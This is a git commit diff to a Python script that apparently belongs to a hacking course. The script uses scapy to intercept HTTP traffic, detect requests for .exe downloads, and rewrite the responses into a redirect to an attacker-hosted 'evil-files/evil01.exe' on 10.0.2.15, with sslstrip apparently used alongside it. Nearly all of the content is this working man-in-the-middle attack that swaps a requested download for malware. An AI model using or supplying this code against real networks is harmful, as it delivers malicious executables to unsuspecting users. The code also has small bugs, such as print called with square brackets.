830ac2981a1d285346bfa2c5023e9b7c8b7158b4
Joseph Asare <asare.joseph33@gmail.com>
2019-11-20 11:43:24 -0500

    Replace download updated *sslstrip.

--- 7.replace_downloads/replace_downloads.py
+++ 7.replace_downloads/replace_downloads.py
@@ -13,19 +13,18 @@ def set_load(packet, load):
     return packet
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
-    if scapy.Raw in scapy_packet and scapy.TCP in scapy_packet:#scapy_packet.haslayer(scapy.Raw):
+    if scapy_packet.haslayer(scapy.Raw):
         if scapy_packet[scapy.TCP].dport == 10000:
             if ".exe" in scapy_packet[scapy.Raw].load and "10.0.2.15" not in scapy_packet[scapy.Raw].load:
-                print["[+] zip Request"]
+                print["[+] exe Request"]
                 ack_list.append(scapy_packet[scapy.TCP].ack)
         elif scapy_packet[scapy.TCP].sport == 10000:
             if scapy_packet[scapy.TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print("[+] Replacing file")
-                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.15/evil-files/evilcorp.exe\n\n")
-
+                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: "
+                                                         "http://10.0.2.15/evil-files/evil01.exe\n\n")
                 packet.set_payload(str(modified_packet))
-
 
     packet.accept()
 
